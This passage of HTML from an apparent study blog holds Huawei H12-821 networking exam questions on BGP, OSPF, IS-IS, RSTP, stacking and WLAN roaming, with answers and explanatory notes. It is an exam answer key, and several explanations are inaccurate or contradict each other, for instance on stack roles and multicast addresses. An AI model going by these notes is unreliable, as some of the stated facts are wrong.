class="line">B</span><br><span class="line">侯选交换机</span><br><span class="line">C</span><br><span class="line">从交换机</span><br><span class="line">D</span><br><span class="line">备交换机</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是B，“侯选交换机”这个角色在堆叠系统中是不存在的，因此选项B是正确的答案。堆叠系统中的交换机角色通常包括：主交换机、从交换机和备份交换机。主交换机是堆叠系统中的核心，处理所有的交换机管理任务，例如配置、故障检测和处理等。从交换机则通过堆叠链路连接到主交换机，接受主交换机的管理指令，并通过链路聚合技术提供多倍带宽和冗余性。备份交换机则在主交换机故障时接替主交换机的角色，保证整个堆叠系统的可靠性。</span><br></pre></td></tr></table></figure><h2 id="用于过滤路由信息以及为通过过滤的路由信息设置路由属性的是下列哪个工具？"><a href="#用于过滤路由信息以及为通过过滤的路由信息设置路由属性的是下列哪个工具？" class="headerlink" title="用于过滤路由信息以及为通过过滤的路由信息设置路由属性的是下列哪个工具？"></a>用于过滤路由信息以及为通过过滤的路由信息设置路由属性的是下列哪个工具？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">route-policy</span><br><span class="line">B</span><br><span class="line">as-path-filter</span><br><span class="line">C</span><br><span class="line">policy-based-route</span><br><span class="line">D</span><br><span class="line">Ip-prefix</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是A。route-policy（路由策略）是一个工具，用于过滤路由信息以及为通过过滤的路由信息设置路由属性。route-policy常用于BGP路由选择过程中，可以基于多种因素，例如路由源、目的、AS路径、AS号码等来过滤和修改路由信息，以满足特定的路由选择策略。AS-path-filter（AS路径过滤器）、policy-based-route（基于策略的路由）和Ip-prefix（IP前缀）也都是与路由相关的工具，但它们不直接用于过滤路由信息以及为通过过滤的路由信息设置路由属性。AS-path-filter主要用于过滤BGP路由表中的路由，可以通过匹配AS路径信息来过滤路由信息。Policy-based-route用于根据路由策略来选择路由，可以通过设置路由匹配条件、策略行为等来实现复杂的路由选择策略。Ip-prefix则是用于匹配IP前缀的一种工具，可以通过设置IP前缀匹配条件来过滤和选择路由。</span><br></pre></td></tr></table></figure><h2 id="下面是关于路由选择工具的描述其中表述错误的是"><a href="#下面是关于路由选择工具的描述其中表述错误的是" class="headerlink" title="下面是关于路由选择工具的描述其中表述错误的是"></a>下面是关于路由选择工具的描述其中表述错误的是</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">route-policy只能匹配路由和数据包，并不能用来修改路由属性或者数据包的转发行为</span><br><span class="line">B</span><br><span class="line">前缀列表(ip-prefix)匹配对象为路由信息的目的地址</span><br><span class="line">C</span><br><span class="line">访同控列表(ACL)用于匹IP路由信息或者数据包的地址</span><br><span class="line">D</span><br><span class="line">as-path-filter是用来匹配BGP路由信息中的AS-PATH属性的，所以它只能用于过滤BGP路由</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">选项A中的描述是错误的。route-policy工具不仅可以匹配路由和数据包，还可以修改路由属性和数据包的转发行为。在路由选择过程中，可以使用route-policy工具根据特定的匹配条件来设置路由属性，例如跃点数、带宽、AS-PATH等，以及控制路由信息的转发行为，例如路由重定向、路由重写等。因此，选项A中的描述是错误的。</span><br><span class="line"></span><br><span class="line">选项B、C、D中的描述是正确的。前缀列表工具(ip-prefix)用于匹配路由信息的目的地址，访问控制列表工具(ACL)用于匹配IP路由信息或者数据包的地址，而as-path-filter工具则用于匹配BGP路由信息中的AS-PATH属性，因此只能用于过滤BGP路由。</span><br></pre></td></tr></table></figure><h2 id="关于summary-automatic命令和BGP聚合的描述，错误的是"><a href="#关于summary-automatic命令和BGP聚合的描述，错误的是" class="headerlink" title="关于summary automatic命令和BGP聚合的描述，错误的是?"></a>关于summary automatic命令和BGP聚合的描述，错误的是?</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">该命令用于实现自动聚合其优先级高于手动聚合</span><br><span class="line">B</span><br><span class="line">配置该命令后，BGP将按自然网段聚合路由</span><br><span class="line">C</span><br><span class="line">该命令用来使能对本地引入的路由进行自动聚合</span><br><span class="line">D</span><br><span class="line">配置该命令后，BGP只向对等体发送聚合后的路由</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是A，配置summary automatic后，BGP的自动路由聚合功能就打开</span><br><span class="line">本地路由的优先级：手动聚合&gt;自动聚合&gt;network&gt;import&gt;从对等体学到的</span><br></pre></td></tr></table></figure><h2 id="BGP协议有一种消息是在BGP邻居之间周期性地发送，用以维护邻居关系。这种消息是"><a href="#BGP协议有一种消息是在BGP邻居之间周期性地发送，用以维护邻居关系。这种消息是" class="headerlink" title="BGP协议有一种消息是在BGP邻居之间周期性地发送，用以维护邻居关系。这种消息是"></a>BGP协议有一种消息是在BGP邻居之间周期性地发送，用以维护邻居关系。这种消息是</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">Update</span><br><span class="line">B</span><br><span class="line">Hello</span><br><span class="line">C</span><br><span class="line">open</span><br><span class="line">D</span><br><span class="line">Keepalive</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是D，Keepalive消息，是在BGP邻居之间周期性地发送，用以维护邻居关系。Keepalive消息用于告诉邻居BGP会话仍然是活动的，以防止邻居在长时间内未收到消息时错误地判断BGP会话已经断开。如果一定时间内未收到对端发送的Keepalive消息，则认为与对端的BGP会话已经断开。因此，Keepalive</span><br></pre></td></tr></table></figure><h2 id="在没有启用BGP路径负载分担的情况下，哪种BGP路由会发送BGP邻居？"><a href="#在没有启用BGP路径负载分担的情况下，哪种BGP路由会发送BGP邻居？" class="headerlink" title="在没有启用BGP路径负载分担的情况下，哪种BGP路由会发送BGP邻居？"></a>在没有启用BGP路径负载分担的情况下，哪种BGP路由会发送BGP邻居？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">从所有邻居学到的所有BGP路由</span><br><span class="line">B</span><br><span class="line">只有被BGP优选的最佳路由</span><br><span class="line">C</span><br><span class="line">只有从IBGP学到的路由</span><br><span class="line">D</span><br><span class="line">只有从EBGP学到的路由</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是B，在没有启用BGP路径负载分担的情况下，BGP将只向邻居发送其所选择的最佳路由，因此选项B是正确答案。 BGP将不发送学习到的所有路由，而只发送其所选择的最佳路由。这可以避免发送大量路由信息，从而减少网络流量和邻居路由表的大小。</span><br></pre></td></tr></table></figure><h2 id="在BGP配置中使用认证，应该如何配置？"><a href="#在BGP配置中使用认证，应该如何配置？" class="headerlink" title="在BGP配置中使用认证，应该如何配置？"></a>在BGP配置中使用认证，应该如何配置？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">一对BGP对等体之间必须使用相同的MD5 password</span><br><span class="line">B</span><br><span class="line">AS内的所有路由器必须使用相同的password</span><br><span class="line">C</span><br><span class="line">一台路由器上的所有BGP对等体都必须使用相同的password</span><br><span class="line">D</span><br><span class="line">同一个AS内的所有路由器都必须使用相同的password</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是A，在BGP配置中使用认证，应该配置一对BGP对等体之间使用相同的MD5 password，这可以通过在路由器BGP配置中使用neighbor password &lt;password&gt;命令来完成。只有在两个BGP对等体之间配置了相同的密码，它们才能正常交换BGP路由信息。</span><br><span class="line"></span><br><span class="line">选项B、C、D都不正确。在BGP中，AS内的路由器可以使用不同的密码进行认证，不需要使用相同的密码。同样，一台路由器上的不同BGP对等体也可以使用不同的密码进行认证</span><br></pre></td></tr></table></figure><h2 id="答下列关于交换设备转发平面说法不正确的是？"><a href="#答下列关于交换设备转发平面说法不正确的是？" class="headerlink" title="答下列关于交换设备转发平面说法不正确的是？"></a>答下列关于交换设备转发平面说法不正确的是？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">实现报文的封装和解封装</span><br><span class="line">B</span><br><span class="line">由主控板以及接口板组成</span><br><span class="line">C</span><br><span class="line">提供高速无阻塞的数据通道</span><br><span class="line">D</span><br><span class="line">可以实现报文的统计</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是B，网络设备一般分为控制平面和转发平面，转发平面即数据的转发，可实现报文的封装和解封.提供无阻塞数据通道，并且可以实现报文统计。控制平面主要为协议报文的交互及协议表项的生成。主控板主要负责控制平面的工作而非转发平面。因此答案选B。</span><br></pre></td></tr></table></figure><h2 id="面关于各个协议下发缺省路由的配置命令，描述错误的是"><a href="#面关于各个协议下发缺省路由的配置命令，描述错误的是" class="headerlink" title="面关于各个协议下发缺省路由的配置命令，描述错误的是"></a>面关于各个协议下发缺省路由的配置命令，描述错误的是</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">在ISIS协议中，default-route-advertise命令用来将缺省路由信息通告给邻居</span><br><span class="line">B</span><br><span class="line">在静态路由中，ip route-static default preferencer命令用来在当前路由器生成一条缺省路由</span><br><span class="line">C</span><br><span class="line">在OSPF协议中，default-route-advertised命令用来将缺省路由信息通告到普通OSPF区域</span><br><span class="line">D</span><br><span class="line">在BGP协议中，default-route imported命令用使能将省路由引入到BGP路由表中的功能</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">关于各个协议下发缺省路由的配置命令，描述错误的是 B，即 “在静态路由中，ip route-static default preferencer命令用来在当前路由器生成一条缺省路由”。实际上，在静态路由中，生成缺省路由的命令应该是 ip route-static 0.0.0.0 0.0.0.0 [next-hop] [preference]。其中，0.0.0.0 0.0.0.0 表示匹配所有的目的地址，next-hop 表示下一跳地址，preference 表示该路由的优先级。</span><br><span class="line"></span><br><span class="line">其他选项中：</span><br><span class="line">A. 在 ISIS 协议中，default-route-advertise 命令的确用来将缺省路由信息通告给邻居。</span><br><span class="line">C. 在 OSPF 协议中，default-route-advertised 命令的确用来将缺省路由信息通告到普通 OSPF 区域。</span><br><span class="line">D. 在 BGP 协议中，default-route imported 命令的确用来使能将缺省路由引入到 BGP 路由表中的功能。</span><br><span class="line"></span><br><span class="line">因此，除了选项B不正确外，其他选项都是正确的描述。</span><br></pre></td></tr></table></figure><h2 id="VRRP的报文的组播目的地址是："><a href="#VRRP的报文的组播目的地址是：" class="headerlink" title="VRRP的报文的组播目的地址是："></a>VRRP的报文的组播目的地址是：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">224.0.1.18</span><br><span class="line">B</span><br><span class="line">224.0.0.18</span><br><span class="line">C</span><br><span class="line">224.0.0.20</span><br><span class="line">D</span><br><span class="line">224.0.1.20</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">VRRP协议使用组播地址来传输VRRP协议报文，其中VRRP协议报文的目的组播地址为224.0.0.18。因此，答案应该是B，即“224.0.0.18”。其他选项中，A和D是组播地址，但不是VRRP报文的目的地址；C中的地址是IGMP协议的组播地址，也不是VRRP报文的目的地址。</span><br></pre></td></tr></table></figure><h2 id="一个交换机上电之后加入一个正在运行的堆叠系统，该行为被称为堆叠加入。"><a href="#一个交换机上电之后加入一个正在运行的堆叠系统，该行为被称为堆叠加入。" class="headerlink" title="一个交换机上电之后加入一个正在运行的堆叠系统，该行为被称为堆叠加入。"></a>一个交换机上电之后加入一个正在运行的堆叠系统，该行为被称为堆叠加入。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">True</span><br><span class="line">B</span><br><span class="line">False</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">这个说法是正确的。在堆叠技术中，将多个物理交换机通过特定的堆叠接口互相连接成为一个逻辑交换机，以提高网络的可扩展性和可管理性。在将新的交换机加入现有的堆叠系统时，需要通过特定的命令将其加入到堆叠中，使其成为堆叠系统的一部分。这个过程被称为“堆叠加入”。因此，选项A“True”是正确的。</span><br></pre></td></tr></table></figure><h2 id="以下哪个不是堆叠交换机的角色？"><a href="#以下哪个不是堆叠交换机的角色？" class="headerlink" title="以下哪个不是堆叠交换机的角色？"></a>以下哪个不是堆叠交换机的角色？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">Master</span><br><span class="line">B</span><br><span class="line">Backup</span><br><span class="line">C</span><br><span class="line">Standby</span><br><span class="line">D</span><br><span class="line">Slave</span><br><span class="line"></span><br><span class="line">答案是B，堆叠交换机三种角色：主交换机（Master） 、备交换机（Standby） 、从交换机（Slave）</span><br></pre></td></tr></table></figure><h1 id="display-current-configuration-include-vlan命令的含义是？"><a href="#display-current-configuration-include-vlan命令的含义是？" class="headerlink" title="display current-configuration|include vlan命令的含义是？"></a>display current-configuration|include vlan命令的含义是？</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">查看各VLAN下绑定的物理接口信息</span><br><span class="line">B</span><br><span class="line">查看所有包含&quot;VLAN&quot;关键字的配置</span><br><span class="line">C</span><br><span class="line">查看当前创建了哪些VLAN</span><br><span class="line">D</span><br><span class="line">查看VLANIF接☐的IP地址</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是B，&quot;display current-configuration&quot;是查看当前设备的配置信息，&quot;|include&quot;是管道符号，用于在当前命令的输出中筛选包含指定关键字的内容，因此&quot;display current-configuration|include vlan&quot;命令的含义是：查看所有包含&quot;vlan&quot;关键字的配置。</span><br></pre></td></tr></table></figure><h2 id="关于OSPF计算最短路径树阶段描述正确的是"><a href="#关于OSPF计算最短路径树阶段描述正确的是" class="headerlink" title="关于OSPF计算最短路径树阶段描述正确的是"></a>关于OSPF计算最短路径树阶段描述正确的是</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">第一阶段计算Stub网段，第二阶段计算路由器节点和Transit网段</span><br><span class="line">B</span><br><span class="line">第一阶段计算路由节点和Transit网段，第二阶段计算Stub网段</span><br><span class="line">C</span><br><span class="line">第一阶段计算Stub属段，第二阶段计算路由节点</span><br><span class="line">D</span><br><span class="line">第一阶段计算路由节点第二阶段计算Stub网段</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">正确答案是B。</span><br><span class="line"></span><br><span class="line">在OSPF中，计算最短路径树的过程被分为两个阶段，即分别计算路由节点和Transit网段，以及计算Stub网段。</span><br><span class="line"></span><br><span class="line">第一阶段是计算路由节点和Transit网段的过程，也称为链路状态数据库（LSDB）计算。在这个阶段，路由器收集和处理邻居路由器发送的链路状态通告（LSA），以构建一个完整的LSDB。然后，通过运行最短路径树算法来计算到达每个节点的最短路径，并将结果存储在路由表中。</span><br><span class="line"></span><br><span class="line">第二阶段是计算Stub网段的过程，也称为最短路径树（SPF）计算。在这个阶段，路由器会计算到达每个Stub网段的最短路径，并将这些路径添加到路由表中。</span><br><span class="line"></span><br><span class="line">因此，选项B描述了正确的OSPF计算最短路径树的过程。</span><br></pre></td></tr></table></figure><h2 id="关于IGMP-Snooping-工作机制的描述，正确的是"><a href="#关于IGMP-Snooping-工作机制的描述，正确的是" class="headerlink" title="关于IGMP Snooping-工作机制的描述，正确的是"></a>关于IGMP Snooping-工作机制的描述，正确的是</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">二层交换机通过不断监听IGMP报文，在二层建立和维护PIM路由表</span><br><span class="line">B</span><br><span class="line">没有运行IGMP Snooping时，组播报文将在二层广播运行IGMP Snooping后，报文将不再在二层广播，而是进行二层组播</span><br><span class="line">C</span><br><span class="line">如果主机发出IGMP离开报文时，交换机将该主机加入到相应的组播表中</span><br><span class="line">D</span><br><span class="line">如果主机发出IGMP主机报告报文时，交换机将删除与该主机对应的组播表项</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">正确答案是B。</span><br><span class="line"></span><br><span class="line">IGMP Snooping是一种在二层交换机上运行的协议，用于过滤和转发组播流量，以提高组播性能和网络带宽利用率。其工作机制如下：</span><br><span class="line"></span><br><span class="line">当交换机收到一个IGMP报文时，它会检查报文中的组播组地址，并将该地址添加到相应的组播表中。组播表记录了每个端口上的组播组成员信息。</span><br><span class="line"></span><br><span class="line">如果在接收到组播流量时，交换机的某个端口上没有组播组成员，则交换机不会将流量转发到该端口。这样可以减少不必要的流量并提高网络性能。</span><br><span class="line"></span><br><span class="line">因此，选项B描述了IGMP Snooping的工作机制，即IGMP Snooping会在二层交换机上运行，过滤和转发组播流量，并将组播表用于维护组播组成员信息，从而减少不必要的流量并提高网络性能。</span><br></pre></td></tr></table></figure><h2 id="IS-IS中地址的总长度最少为多少Byte"><a href="#IS-IS中地址的总长度最少为多少Byte" class="headerlink" title="IS-IS中地址的总长度最少为多少Byte?"></a>IS-IS中地址的总长度最少为多少Byte?</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">2</span><br><span class="line">B</span><br><span class="line">8</span><br><span class="line">C</span><br><span class="line">20</span><br><span class="line">D</span><br><span class="line">16</span><br><span class="line">答案：B</span><br></pre></td></tr></table></figure><h2 id="某位网络工程师在排查OSPF协议故障时输出信息如下，据此判断哪种原因导致邻接关系无法正常建立？"><a href="#某位网络工程师在排查OSPF协议故障时输出信息如下，据此判断哪种原因导致邻接关系无法正常建立？" class="headerlink" title="某位网络工程师在排查OSPF协议故障时输出信息如下，据此判断哪种原因导致邻接关系无法正常建立？"></a>某位网络工程师在排查OSPF协议故障时输出信息如下，据此判断哪种原因导致邻接关系无法正常建立？</h2><p><img src="/H12-821/1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">答案：A,display ospf error命令为查看ospf的错误信息。从显示信息可知，bad area id 显示的数值为4，由此可知是由于区域号码不匹配导致的ospf协议故障。 因此答案选A。</span><br></pre></td></tr></table></figure><h2 id="如图所示，在一个纯IPV6环境中，若想实现PC1与PC2之间的通信，下列哪组地址可以分别配置在PC1与P2上"><a href="#如图所示，在一个纯IPV6环境中，若想实现PC1与PC2之间的通信，下列哪组地址可以分别配置在PC1与P2上" class="headerlink" title="如图所示，在一个纯IPV6环境中，若想实现PC1与PC2之间的通信，下列哪组地址可以分别配置在PC1与P2上"></a>如图所示，在一个纯IPV6环境中，若想实现PC1与PC2之间的通信，下列哪组地址可以分别配置在PC1与P2上</h2><p><img src="/H12-821/2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">2001:FDC::1/64 2001:FDC::2/64</span><br><span class="line">B</span><br><span class="line">2001:FDC::1/64 2001:FDC:1::2/64</span><br><span class="line">C</span><br><span class="line">FD00:1AC0:872E::1/64 FD00:2BE1:2320::1/64</span><br><span class="line">D</span><br><span class="line">FE80::1/64 FE80::2/64</span><br><span class="line">答案：B</span><br></pre></td></tr></table></figure><h2 id="四台路由器运行IS-IS且已经建立邻接关系-区域号和路由器的等级如图中标记-下列说法中正确的有"><a href="#四台路由器运行IS-IS且已经建立邻接关系-区域号和路由器的等级如图中标记-下列说法中正确的有" class="headerlink" title="四台路由器运行IS-IS且已经建立邻接关系,区域号和路由器的等级如图中标记,下列说法中正确的有?"></a>四台路由器运行IS-IS且已经建立邻接关系,区域号和路由器的等级如图中标记,下列说法中正确的有?</h2><p><img src="/H12-821/3.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">R2和R3都会产生ATT置位的Level-1的LSP</span><br><span class="line">B</span><br><span class="line">R1没有R4产生的LSP，因此R1只通过缺省路由和R4通信</span><br><span class="line">C</span><br><span class="line">R2和R3都会产生ATT置位的Leve1-2的LSP</span><br><span class="line">D</span><br><span class="line">R2和R3互相学习缺省路由，该网络出现路由环路</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是A,在IS-IS网络中，level2、level1-2路由器会拥有全网的路由信息，而level1路由器只会拥有本区域的路由信息，因此level1-2路由器与level1路由器建立邻居关系的时候，会发送ATT置位的LSP给level1路由器，level1路由器收到后会产生一条默认路由指向level1-2路由器。从而能够访问IS-IS网络。</span><br></pre></td></tr></table></figure><h2 id="某交换机运行RSTP协议其相关配置信息如图所示，请根据命令配置情况指出对于Instance1-该交换机的角色是："><a href="#某交换机运行RSTP协议其相关配置信息如图所示，请根据命令配置情况指出对于Instance1-该交换机的角色是：" class="headerlink" title="某交换机运行RSTP协议其相关配置信息如图所示，请根据命令配置情况指出对于Instance1,该交换机的角色是："></a>某交换机运行RSTP协议其相关配置信息如图所示，请根据命令配置情况指出对于Instance1,该交换机的角色是：</h2><p><img src="/H12-821/4.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">根交换机</span><br><span class="line">B</span><br><span class="line">非根交换机</span><br><span class="line">C</span><br><span class="line">交换机</span><br><span class="line">D</span><br><span class="line">无法判断</span><br><span class="line"></span><br><span class="line">笔记:</span><br><span class="line">答案是A，display stp brief中MSTID一列代表此交换机的端口在某实例中的端口角色及状态，由题目显示信息可知，SWA在实例1中的两个端口角色为DESI（指定端口）。交换机端口角色全为指定端口一定是根交换机。因此答案选A。（多选则AC*）</span><br></pre></td></tr></table></figure><h2 id="下面是一台路由器的部分配置，关于该配置描述正确的是："><a href="#下面是一台路由器的部分配置，关于该配置描述正确的是：" class="headerlink" title="下面是一台路由器的部分配置，关于该配置描述正确的是："></a>下面是一台路由器的部分配置，关于该配置描述正确的是：</h2><p><img src="/H12-821/5.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">源地址为1.1.1.1的数据包匹配第一条ACL语句rule0,匹配规则为允许</span><br><span class="line">B</span><br><span class="line">源地址为1.1.1.3的数据包匹配第三条ACL语句rule2,匹配规则为拒绝</span><br><span class="line">C</span><br><span class="line">源地址为1.1.1.4的数据包匹配第四条ACL语句rue3,匹配规则为允许</span><br><span class="line">D</span><br><span class="line">源地址为1.1.1.2的数据包匹配第二条ACL语句rule1,匹配规则为允许</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">由题可知，rule 0匹配ip地址1.1.1.1，执行动作为允许。rule 1匹配ip地址1.1.1.1，执行动作为拒绝。rule 2匹配ip地址1.1.0.0/16这个ip网段，执行动作为允许。rule 3匹配所有ip，执行动为拒绝。源地址为1.1.1.1的数据可以匹配rule0和rule1，但是只会优先匹配rule0，rule0匹配到后就不会查看rule1了。1.1.1.3可匹配rule2，动作为允许、1.1.1.4可匹配rule2，动作为允许，1.1.1.2匹配rule2，动作为允许。因此答案选A</span><br></pre></td></tr></table></figure><h2 id="下面关于OSPF邻居信息的说法，错误的是："><a href="#下面关于OSPF邻居信息的说法，错误的是：" class="headerlink" title="下面关于OSPF邻居信息的说法，错误的是："></a>下面关于OSPF邻居信息的说法，错误的是：</h2><p><img src="/H12-821/6.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">邻居的router id是2.2.2.2</span><br><span class="line">B</span><br><span class="line">本路由器是Master</span><br><span class="line">C</span><br><span class="line">DR的地址是10.1.1.1</span><br><span class="line">D</span><br><span class="line">本路由器的router id是1.1.1.1</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">display ospf peer 可查看ospf邻居信息，由题可知，本设备的router id为1.1.1.1。邻居的router id为2.2.2.2。Nbr is master 代表邻居是主设备。DR的地址为10.1.1.1。</span><br></pre></td></tr></table></figure><h2 id="如图所示，下列说法中正确的是？"><a href="#如图所示，下列说法中正确的是？" class="headerlink" title="如图所示，下列说法中正确的是？"></a>如图所示，下列说法中正确的是？</h2><p><img src="/H12-821/7.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">R1和R2可以建立邻接关系，但是不能完成路由计算</span><br><span class="line">B</span><br><span class="line">R1和R2可以建立邻接关系，并且能完成路由计算</span><br><span class="line">C</span><br><span class="line">R1和R2不能建立邻接关系，因为接口的网络类型不一致</span><br><span class="line">D</span><br><span class="line">R1和R2不能建立邻接关系，因为OSPF进程号不一致</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">由题可知，R1将G0/0/0口的ospf的网络类型改成了P2P，并且两台设备的互联接口都运行了ospf协议，ospf路由器之间建立邻居关系，并不会协商网络类型，因此R1和R2的邻居关系可以正常建立。但是P2P网络使用1类lsa的link type为P2P、STUB描述路由和拓扑信息，MA网络使用1类lsa的link type为transit 以及2类lsa 描述路由和拓扑信息。因此计算无法完成路由计算。因此答案选A。</span><br></pre></td></tr></table></figure><h2 id="如图所示，漫游前数据流量的转发为STA-HAP-上层网络，转发方式为直接转发，并且在AP上配置了家乡代理，经过三层漫游以后，数据的转发流量走向是？"><a href="#如图所示，漫游前数据流量的转发为STA-HAP-上层网络，转发方式为直接转发，并且在AP上配置了家乡代理，经过三层漫游以后，数据的转发流量走向是？" class="headerlink" title="如图所示，漫游前数据流量的转发为STA-HAP-上层网络，转发方式为直接转发，并且在AP上配置了家乡代理，经过三层漫游以后，数据的转发流量走向是？"></a>如图所示，漫游前数据流量的转发为STA-HAP-上层网络，转发方式为直接转发，并且在AP上配置了家乡代理，经过三层漫游以后，数据的转发流量走向是？</h2><p><img src="/H12-821/8.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">STA-FAP-FAC-HAC-HAP-上层网络</span><br><span class="line">B</span><br><span class="line">STA-FAP-FAC-HAC-上层网络</span><br><span class="line">C</span><br><span class="line">STA-FAP-FAC-上层网络</span><br><span class="line">D</span><br><span class="line">STA-FAP-FAC-HAC-HAP-HAC-上层网络</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">漫游前： </span><br><span class="line"></span><br><span class="line">STA发送业务报文给HAP。HAP接收到业务报文后直接将业务报文经过交换机发送给上层网络。漫游后：</span><br><span class="line"></span><br><span class="line">STA发送业务报文给FAP。FAP接收到STA发送的业务报文并通过CAPWAP隧道发送给FAC。</span><br><span class="line"></span><br><span class="line">FAC通过HAC和FAC之间的AC间隧道将业务报文转发给HAC。HAC通过CAPWAP隧道将业务报文发送给HAP。HAP直接将业务报文发送给上层网络。因此答案选A.</span><br></pre></td></tr></table></figure><h2 id="如图所示SWA、SWB、SWC都运行RSTP，SWB上的GE0-x2F-0-x2F-2端口和SWC上的GE0-x2F-0-x2F-1端口角色为？"><a href="#如图所示SWA、SWB、SWC都运行RSTP，SWB上的GE0-x2F-0-x2F-2端口和SWC上的GE0-x2F-0-x2F-1端口角色为？" class="headerlink" title="如图所示SWA、SWB、SWC都运行RSTP，SWB上的GE0&#x2F;0&#x2F;2端口和SWC上的GE0&#x2F;0&#x2F;1端口角色为？"></a>如图所示SWA、SWB、SWC都运行RSTP，SWB上的GE0&#x2F;0&#x2F;2端口和SWC上的GE0&#x2F;0&#x2F;1端口角色为？</h2><p><img src="/H12-821/9.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">backup端口、Alternative端口</span><br><span class="line">B</span><br><span class="line">Alternative端口、Backup端口</span><br><span class="line">C</span><br><span class="line">Root端口、Designate端口</span><br><span class="line">D</span><br><span class="line">Backup端口、Root端口</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是A，AP端口和BP端口的判定原则，当一个需要阻塞的端口收到的BPDU为本设备发送的BPDU时，此端口为BP端口，当一个需要阻塞的端口收到的BPDU为其他设备发送的BPDU时，此端口为AP端口。</span><br><span class="line"></span><br><span class="line">在本例中SWB和SWC的三个接口看成一条链路，其中指定端口已被选举，那么SWB的G0/0/1和SWC的G0/0/1将被阻塞，通过对比上面的判定原则，SWB的G0/0/2口收到来自本链路的指定端口发送的BPDU，由于指定端口在SWB上，因此收到的BPDU为本设备发送的BPDU，所以此端口为BP端口，SWC的G0/0/1口收到来自SWB的指定端口发送的BPDU，为其他设备发送的BPDU。因此此端口为AP端口。</span><br></pre></td></tr></table></figure><h2 id="下面是一台路由器的输出信息，关于这段信息描述正确的是"><a href="#下面是一台路由器的输出信息，关于这段信息描述正确的是" class="headerlink" title="下面是一台路由器的输出信息，关于这段信息描述正确的是"></a>下面是一台路由器的输出信息，关于这段信息描述正确的是</h2><p><img src="/H12-821/10.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">目的网段1.1.1.0/24所携带的团体属性值是no-export,表明该路由条目不能通告给任何BGP邻居</span><br><span class="line">B</span><br><span class="line">目的网段5.1.1.0/24所携带的团体属性值是no-advertise,表明该路由条目不能被通告给任何其他的BGP对等体</span><br><span class="line">C</span><br><span class="line">目的网段1.1.1.0/24所携带的团体属性值是no-export,表明该路由条目可以通告给任何BGP邻居</span><br><span class="line">D</span><br><span class="line">目的网段5.1.1.0/24所携的团体属性值是no-advertise,表明该路由条目不能被通告到本地AS之外</span><br><span class="line"></span><br><span class="line">笔记：答案是B</span><br><span class="line">①、Internet ：缺省属性，所有路由都属于Internet，此属性的路由可以通告给所有BGP的邻居</span><br><span class="line">②、No_Export ：收到此属性的路由后，不会将该路由发布给其他的AS。</span><br><span class="line">③、No_Advertise ：收到此属性的路由后，不会将该路由通告给任何BGP邻居。</span><br><span class="line">④、No_Export_Subconfed ：在联盟中使用</span><br></pre></td></tr></table></figure><h2 id="某台路由器运行IS-IS-其输出信息如图所示，下列说法错误的是？"><a href="#某台路由器运行IS-IS-其输出信息如图所示，下列说法错误的是？" class="headerlink" title="某台路由器运行IS-IS,其输出信息如图所示，下列说法错误的是？"></a>某台路由器运行IS-IS,其输出信息如图所示，下列说法错误的是？</h2><p><img src="/H12-821/11.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">邻居路由器的System-lD为0002.0200.2002</span><br><span class="line">B</span><br><span class="line">本路由器是DIS</span><br><span class="line">C</span><br><span 